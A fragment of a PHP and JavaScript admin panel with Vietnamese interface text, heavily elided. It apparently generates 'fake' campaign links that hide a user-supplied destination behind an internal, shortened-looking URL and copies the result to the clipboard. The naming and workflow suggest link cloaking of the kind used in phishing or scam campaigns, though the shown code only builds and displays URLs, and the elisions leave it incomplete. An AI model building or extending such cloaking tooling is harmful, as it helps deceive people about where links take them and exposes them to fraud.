...
if (isset($_GET['action'])) {
    ...
    if ($_GET['action'] === 'auto_fake_link') {
        ...
        $short = $campaign;
        echo json_encode(['ok' => true, 'id' => $lid, 'url' => $campaign, 'short' => $short, 'local_only' => true]);
    }
    if ($_GET['action'] === 'push') {
...
<body class="flex h-screen overflow-hidden uppercase italic font-black text-[10px] tracking-tighter">
        ...
        <div id="t8" class="tab-content max-w-5xl mx-auto space-y-8">
            ...
            <div class="grid lg:grid-cols-2 gap-8">
                <div class="card space-y-4 shadow-2xl">
                    ...
                    <p class="text-[8px] text-slate-400 normal-case italic">Nhập link ẩn/link đích để hệ thống tự tạo link nội bộ hiển thị rút gọn.</p>
                ...
                <div class="card space-y-4">
                    ...
                    <p class="text-[8px] text-slate-400 normal-case italic leading-relaxed">1) Tạo/lưu dự án ở tab Dự án chiến dịch. 2) Qua tab này, bấm “Lấy link form” để lấy URL dạng <code>?v=ID</code>. 3) Bấm “Kết nối API” để server tạo link nội bộ và hiển thị link rút gọn.</p>
    ...
    <script>
        ...
        async function autoCreateFakeLink(skipShort=false){ const redir=document.getElementById('hidden_dest_url').value.trim(); if(!redir){ alert('Nhập link ẩn/link đích trước.'); return; } try{ const res=await fetch('?action=auto_fake_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({redir, skip_short: skipShort ? '1' : '0'})}); const data=await res.json(); if(!data.ok) throw new Error(data.error || 'Lỗi không xác định'); document.getElementById('auto_campaign_url').value=data.url; document.getElementById('auto_short_url').value=data.short || data.url; document.getElementById('api_source_url').value=data.url; document.getElementById('api_short_url').value=data.short || data.url; await navigator.clipboard.writeText(data.short || data.url); alert('Đã tự tạo link và copy kết quả!'); }catch(e){ document.getElementById('auto_short_url').value='Lỗi: '+e.message; } }
